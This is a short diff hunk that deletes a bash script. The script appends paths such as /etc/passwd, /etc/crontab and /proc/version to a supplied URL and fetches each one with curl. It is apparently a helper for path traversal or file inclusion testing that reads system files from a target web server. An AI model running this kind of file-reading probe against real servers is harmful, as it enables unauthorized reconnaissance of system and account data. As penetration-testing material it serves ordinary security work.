@@ -1,9 +1,0 @@
-#!/bin/bash
-
-url="$1"
-files=("/etc/passwd" "/etc/crontab" "/proc/mounts" "/etc/issue" "/proc/version" "/etc/resolv.conf" "/etc/hostname" "/etc/anacrontab")
-for filename in ${files[@]};do
-  echo "----$filename----"
-  curl --silent "$url$filename" 
-  echo
-done
